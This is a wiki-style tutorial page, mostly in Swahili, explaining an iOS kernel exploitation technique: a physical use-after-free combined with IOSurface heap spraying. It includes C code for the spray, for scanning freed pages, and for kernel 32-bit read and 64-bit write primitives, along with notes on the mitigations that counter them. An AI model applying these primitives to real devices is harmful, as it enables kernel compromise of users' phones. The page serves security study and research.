# iOS Physical Use After Free via IOSurface

{{#include ../../banners/hacktricks-training.md}}


## Physical use-after-free

Hii ni muhtasari wa chapisho kutoka [https://alfiecg.uk/2024/09/24/Kernel-exploit.html](https://alfiecg.uk/2024/09/24/Kernel-exploit.html); zaidi ya hayo, taarifa za ziada kuhusu exploit inayotumia tekniki hii zinapatikana katika [https://github.com/felix-pb/kfd](https://github.com/felix-pb/kfd)

### Usimamizi wa kumbukumbu katika XNU <a href="#memory-management-in-xnu" id="memory-management-in-xnu"></a>

**virtual memory address space** kwa michakato ya mtumiaji kwenye iOS inashughulikia anuwai kutoka **0x0 hadi 0x8000000000**. Hata hivyo, anwani hizi hazitafsiri moja kwa moja kuwa kumbukumbu ya kimwili. Badala yake, **kernel** hutumia **page tables** kutafsiri anwani za virtual kuwa **physical addresses** halisi.

#### Ngazi za Page Tables katika iOS

Page tables zimepangwa kwa muundo wa mlolongo katika ngazi tatu:

1. **L1 Page Table (Level 1)**:
* Kila entry hapa inawakilisha anuwai kubwa ya virtual memory.
* Inafunika **0x1000000000 bytes** (au **256 GB**) ya virtual memory.
2. **L2 Page Table (Level 2)**:
* Entry hapa inawakilisha eneo ndogo ya virtual memory, haswa **0x2000000 bytes** (32 MB).
* Kuingia kwa L1 kunaweza kuonyesha kwenye L2 table ikiwa haifanyi mapping ya eneo zima yenyewe.
3. **L3 Page Table (Level 3)**:
* Hii ni ngazi ya mwisho, ambapo kila entry inamezea ukurasa mmoja wa kumbukumbu wa **4 KB**.
* Entry ya L2 inaweza kuonyesha kwenye L3 table ikiwa inahitajika udhibiti wa undani zaidi.

#### Kuweka Mapping ya Virtual kwa Physical Memory

* **Direct Mapping (Block Mapping)**:
* Baadhi ya entry katika page table zinamap moja kwa moja anuwai za anwani za virtual kwa anuwai inayoendelea ya anwani za physical (kama njia fupi).
* **Pointer to Child Page Table**:
* Ikiwa inahitajika udhibiti wa kina, entry katika ngazi moja (mfano, L1) inaweza kuelekeza kwenye **child page table** kwenye ngazi inayofuata (mfano, L2).

#### Mfano: Kuweka Mapping ya Anwani ya Virtual

Tuseme unajaribu kupata anwani ya virtual **0x1000000000**:

1. **L1 Table**:
* Kernel inakagua entry ya L1 inayohusiana na anwani hii ya virtual. Ikiwa ina **pointer to an L2 page table**, inaendelea kwa L2 table hiyo.
2. **L2 Table**:
* Kernel inakagua L2 page table kwa mapping ya undani zaidi. Ikiwa entry hii inaonyesha kwenye **L3 page table**, inaendelea huko.
3. **L3 Table**:
* Kernel inatafuta entry ya mwisho ya L3, ambayo inaonyesha kwenye **physical address** ya ukurasa wa kumbukumbu halisi.

#### Mfano wa Mapping ya Anwani

Ikiwa unaandika anwani ya physical **0x800004000** kwenye index ya kwanza ya L2 table, basi:

* Anwani za virtual kutoka **0x1000000000** hadi **0x1002000000** zinamap kuwa anwani za physical kutoka **0x800004000** hadi **0x802004000**.
* Hii ni **block mapping** kwenye ngazi ya L2.

Vinginevyo, ikiwa entry ya L2 inaonyesha kwenye L3 table:

* Kila ukurasa wa 4 KB katika anuwai ya virtual **0x1000000000 -> 0x1002000000** utapangwa na entry za kibinafsi katika L3 table.

### Physical use-after-free

A **physical use-after-free** (UAF) hutokea wakati:

1. Mchakato unafanya **allocate** kumbukumbu fulani kama inayoweza kusomwa na kuandikwa (readable and writable).
2. **page tables** zinasasishwa ili kumap kumbukumbu hii kwa anwani mahususi za physical ambazo mchakato anaweza kufikia.
3. Mchakato **huondoa** (hutoa/free) kumbukumbu hiyo.
4. Hata hivyo, kutokana na **bug**, kernel **inasahau kuondoa mapping** kutoka page tables, ingawa inatambua kumbukumbu ya physical kama huru.
5. Kernel inaweza kisha **kureallocate kumbukumbu ya physical iliyotolewa** kwa matumizi mengine, kama data za kernel.
6. Kwa sababu mapping haikuondolewa, mchakato bado anaweza **kusoma na kuandika** kwenye kumbukumbu hiyo ya physical.

Hii ina maana mchakato unaweza kufikia **kurasa za kumbukumbu za kernel**, ambazo zinaweza kuwa na data nyeti au miundo, na hivyo kumuwezesha mshambuliaji **kuingilia kumbukumbu ya kernel**.

### IOSurface Heap Spray

Kwa kuwa mshambuliaji hawezi kudhibiti ni kurasa gani za kernel zitapewa kumbukumbu iliyotolewa, wanatumia mbinu inayoitwa **heap spray**:

1. Mshambuliaji **huunda idadi kubwa ya vitu vya IOSurface** kwenye kumbukumbu ya kernel.
2. Kila objektu la IOSurface lina thamani ya **magic** katika moja ya fields zake, kufanya iwe rahisi kutambua.
3. Wanapiga **skana kurasa zilizotolewa** ili kuona kama baadhi ya vitu vya IOSurface vimeangukia kwenye ukurasa uliotolewa.
4. Wakitambua objektu la IOSurface kwenye ukurasa uliotolewa, wanaweza kulitumia **kusoma na kuandika kumbukumbu ya kernel**.

Taarifa za ziada kuhusu hili ziko katika [https://github.com/felix-pb/kfd/tree/main/writeups](https://github.com/felix-pb/kfd/tree/main/writeups)

> [!TIP]
> Fahamu kuwa vifaa vya iOS 16+ (A12+) vina utatuzi wa kiapparatus (kama PPL au SPTM) unaofanya mbinu za physical UAF zisifae kwa urahisi.
> PPL inatekeleza ulinzi mkali wa MMU kwa kurasa zinazohusiana na code signing, entitlements, na data nyeti za kernel, hivyo, hata ukireuse ukurasa, uandishi kutoka userland au kernel iliyovamiwa kwenda kwenye kurasa zilizo chini ya ulinzi wa PPL unatokwama.
> Secure Page Table Monitor (SPTM) inaongeza PPL kwa kuimarisha sasisho za page table yenyewe. Inahakikisha kwamba hata code yenye vibali vya juu ya kernel haiwezi kuremap kwa kimya kurasa zilizotolewa au kuharibu mappings bila kupitia ukaguzi wa usalama.
> KTRR (Kernel Text Read-Only Region), ambayo inafunga sehemu ya code ya kernel kama read-only baada ya boot. Hii inazuia mabadiliko yoyote ya runtime kwa code ya kernel, ikifunga njia kubwa ya shambulio ambayo exploit za physical UAF mara nyingi hutegemea.
> Zaidi ya hayo, allocations za `IOSurface` ziko ngumu kutabirika na vigumu kuzifanikiwa kuzipanga katika maeneo yanayoweza kufikiwa na user, ambayo inafanya mbinu ya “magic value scanning” isitegemeeke sana. Na `IOSurface` sasa inatwaliwa na entitlements na vizuizi vya sandbox.

### Step-by-Step Heap Spray Process

1. **Spray IOSurface Objects**: Mshambuliaji huunda vitu vingi vya IOSurface zikiwa na kitambulisho maalum ("magic value").
2. **Scan Freed Pages**: Wanakagua kama yoyote ya vitu imepangwa kwenye ukurasa uliotolewa.
3. **Read/Write Kernel Memory**: Kwa kuibadilisha fields katika objektu la IOSurface, wanapata uwezo wa kufanya **arbitrary reads and writes** katika kumbukumbu ya kernel. Hii inawawezesha:
* Kutumia field moja kusoma **kima chochote cha 32-bit** katika kumbukumbu ya kernel.
* Kutumia field nyingine kuandika thamani za **64-bit**, wakipata primitive thabiti ya **kernel read/write**.

Generate IOSurface objects with the magic value IOSURFACE\_MAGIC to later search for:
```c
void spray_iosurface(io_connect_t client, int nSurfaces, io_connect_t **clients, int *nClients) {
if (*nClients >= 0x4000) return;
for (int i = 0; i < nSurfaces; i++) {
fast_create_args_t args;
lock_result_t result;

size_t size = IOSurfaceLockResultSize;
args.address = 0;
args.alloc_size = *nClients + 1;
args.pixel_format = IOSURFACE_MAGIC;

IOConnectCallMethod(client, 6, 0, 0, &args, 0x20, 0, 0, &result, &size);
io_connect_t id = result.surface_id;

(*clients)[*nClients] = id;
*nClients = (*nClients) += 1;
}
}
```
Tafuta vitu vya **`IOSurface`** katika ukurasa wa kimwili mmoja ulioachiliwa:
```c
int iosurface_krw(io_connect_t client, uint64_t *puafPages, int nPages, uint64_t *self_task, uint64_t *puafPage) {
io_connect_t *surfaceIDs = malloc(sizeof(io_connect_t) * 0x4000);
int nSurfaceIDs = 0;

for (int i = 0; i < 0x400; i++) {
spray_iosurface(client, 10, &surfaceIDs, &nSurfaceIDs);

for (int j = 0; j < nPages; j++) {
uint64_t start = puafPages[j];
uint64_t stop = start + (pages(1) / 16);

for (uint64_t k = start; k < stop; k += 8) {
if (iosurface_get_pixel_format(k) == IOSURFACE_MAGIC) {
info.object = k;
info.surface = surfaceIDs[iosurface_get_alloc_size(k) - 1];
if (self_task) *self_task = iosurface_get_receiver(k);
goto sprayDone;
}
}
}
}

sprayDone:
for (int i = 0; i < nSurfaceIDs; i++) {
if (surfaceIDs[i] == info.surface) continue;
iosurface_release(client, surfaceIDs[i]);
}
free(surfaceIDs);

return 0;
}
```
### Kupata Kernel Read/Write kwa kutumia IOSurface

Baada ya kupata udhibiti wa object ya IOSurface katika kernel memory (mapped to a freed physical page accessible from userspace), tunaweza kuvitumia kwa ajili ya **arbitrary kernel read and write operations**.

**Sehemu Muhimu katika IOSurface**

The IOSurface object has two crucial fields:

1. **Use Count Pointer**: Inaruhusu **32-bit read**.
2. **Indexed Timestamp Pointer**: Inaruhusu **64-bit write**.

Kwa kuandika upya pointers hizi, tunazituma kwa anwani zozote katika kernel memory, hivyo kuwezesha operesheni za read/write.

#### 32-Bit Kernel Read

Ili kufanya kusoma:

1. Andika upya **use count pointer** ili iashirie anwani lengwa ikipunguzwa kwa offset ya 0x14-byte.
2. Tumia method ya `get_use_count` kusoma thamani kwenye anwani hiyo.
```c
uint32_t get_use_count(io_connect_t client, uint32_t surfaceID) {
uint64_t args[1] = {surfaceID};
uint32_t size = 1;
uint64_t out = 0;
IOConnectCallMethod(client, 16, args, 1, 0, 0, &out, &size, 0, 0);
return (uint32_t)out;
}

uint32_t iosurface_kread32(uint64_t addr) {
uint64_t orig = iosurface_get_use_count_pointer(info.object);
iosurface_set_use_count_pointer(info.object, addr - 0x14); // Offset by 0x14
uint32_t value = get_use_count(info.client, info.surface);
iosurface_set_use_count_pointer(info.object, orig);
return value;
}
```
#### 64-Bit Kernel Write

Ili kufanya uandishi:

1. Overwrite the **indexed timestamp pointer** kwa anwani lengwa.
2. Tumia method `set_indexed_timestamp` kuandika thamani ya 64-bit.
```c
void set_indexed_timestamp(io_connect_t client, uint32_t surfaceID, uint64_t value) {
uint64_t args[3] = {surfaceID, 0, value};
IOConnectCallMethod(client, 33, args, 3, 0, 0, 0, 0, 0, 0);
}

void iosurface_kwrite64(uint64_t addr, uint64_t value) {
uint64_t orig = iosurface_get_indexed_timestamp_pointer(info.object);
iosurface_set_indexed_timestamp_pointer(info.object, addr);
set_indexed_timestamp(info.client, info.surface, value);
iosurface_set_indexed_timestamp_pointer(info.object, orig);
}
```
#### Exploit Flow Recap

1. **Trigger Physical Use-After-Free**: Kurasa zilizofutwa zinaweza kutumika tena.
2. **Spray IOSurface Objects**: Tenga vitu vingi vya IOSurface na "magic value" ya kipekee katika kernel memory.
3. **Identify Accessible IOSurface**: Tafuta IOSurface kwenye freed page unayodhibiti.
4. **Abuse Use-After-Free**: Badilisha pointers katika IOSurface object ili kuwezesha arbitrary **kernel read/write** kupitia IOSurface methods.

Kwa primitives hizi, exploit inatoa controlled **32-bit reads** na **64-bit writes** kwa kernel memory. Hatua za ziada za jailbreak zinaweza kuhusisha read/write primitives imara zaidi, ambazo zinaweza kuhitaji kupitisha kinga za ziada (kwa mfano, PPL kwenye vifaa vipya vya arm64e).

{{#include ../../banners/hacktricks-training.md}}
